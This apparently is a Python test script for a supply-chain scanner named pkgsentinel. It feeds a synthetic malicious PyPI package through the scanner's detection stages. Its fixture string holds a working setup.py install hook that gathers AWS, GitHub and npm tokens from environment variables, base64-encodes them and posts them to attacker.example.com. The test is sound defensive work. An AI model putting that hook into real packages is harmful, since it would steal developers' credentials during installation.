"""
합성 악성 샘플로 파이프라인 탐지 능력 확인.

실제 레지스트리를 건너뛰고, 메모리상에 가짜 ExtractedPackage를 만들어
Stage 2 → 4 → 5 → verdict 을 통과시킨다.
"""
from __future__ import annotations

import sys
from pathlib import Path

# sibling import
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.schema import (
    Ecosystem,
)
from pkgsentinel.stages.stage1_entry_point import EntryFile, ExtractedPackage
from pkgsentinel.stages.stage2_behavior import analyze as analyze_behavior
from pkgsentinel.stages.stage4_ttp_match import match_ttps
from pkgsentinel.stages.stage5_llm_review import review

# ─────────────── 합성 악성 샘플 ───────────────

MALICIOUS_SETUP_PY = '''"""
Synthetic malicious setup.py — credential theft + exfiltration
"""
from setuptools import setup
from setuptools.command.install import install
import os
import base64
import requests


class CustomInstall(install):
    def run(self):
        # 1. 환경변수에서 자격증명 수집
        creds = {
            "AWS_ACCESS_KEY_ID": os.environ.get("AWS_ACCESS_KEY_ID"),
            "AWS_SECRET_ACCESS_KEY": os.environ.get("AWS_SECRET_ACCESS_KEY"),
            "GITHUB_TOKEN": os.environ.get("GITHUB_TOKEN"),
            "NPM_TOKEN": os.environ.get("NPM_TOKEN"),
        }

        # 2. base64 로 인코딩
        payload = base64.b64encode(str(creds).encode()).decode()

        # 3. 외부 서버로 전송
        try:
            requests.post("http://attacker.example.com/collect",
                          data={"data": payload}, timeout=5)
        except Exception:
            pass

        install.run(self)


setup(
    name="synthetic-malicious",
    version="0.0.1",
    cmdclass={"install": CustomInstall},
)
'''

BENIGN_INIT_PY = '''"""Clean __init__.py"""
from .core import App

__version__ = "0.0.1"
'''


def build_synthetic_pkg() -> ExtractedPackage:
    pkg = ExtractedPackage(
        package="synthetic-malicious",
        ecosystem=Ecosystem.PYPI,
        version="0.0.1",
        archive_url="test://local",
        archive_size=len(MALICIOUS_SETUP_PY) + len(BENIGN_INIT_PY),
    )
    pkg.entry_files = [
        EntryFile(
            path="synthetic-malicious-0.0.1/setup.py",
            basename="setup.py",
            content=MALICIOUS_SETUP_PY,
            size=len(MALICIOUS_SETUP_PY),
            language="python",
        ),
        EntryFile(
            path="synthetic-malicious-0.0.1/synthetic_malicious/__init__.py",
            basename="__init__.py",
            content=BENIGN_INIT_PY,
            size=len(BENIGN_INIT_PY),
            language="python",
        ),
    ]
    return pkg


# ─────────────── 메인 ───────────────

def main():
    pkg = build_synthetic_pkg()

    print("== Stage 2: Behavior Sequence ==")
    behavior = analyze_behavior(pkg)
    for fs in behavior.files:
        print(f"  [{fs.path}]")
        for c in fs.calls:
            print(f"    L{c.line:>2}  [{c.dimension.value[:4]}]  {c.name}")
        print(f"    dimensions: {[d.value for d in fs.dimensions]}")

    print("\n== Stage 4: TTP Matching ==")
    match_report = match_ttps(behavior, top_k=3)
    for m in match_report.matches:
        print(f"  sim={m.similarity:.3f}  {m.ttp.ttp_id}  {m.ttp.ttp_name}")
        print(f"    severity={m.ttp.severity.value}  file={m.file_path}")

    print("\n== Stage 5: LLM Review (stub mode) ==")
    for m in match_report.matches[:1]:
        fs = next((f for f in behavior.files if f.path == m.file_path), None)
        if not fs:
            continue
        llm = review(
            pkg.package, pkg.version, pkg.ecosystem.value,
            fs, match_report.matches,
            code_snippet="\n".join(c.snippet for c in fs.calls),
            mode="stub",
        )
        print(f"  LLM verdict: {llm.verdict.value}")
        print(f"  reasoning:   {llm.reasoning}")

    print("\n== Full Pipeline (with registry bypass) ==")
    # 파이프라인은 실제 레지스트리를 요구하므로, 여기선 Stage별 검증만 확인


if __name__ == "__main__":
    main()
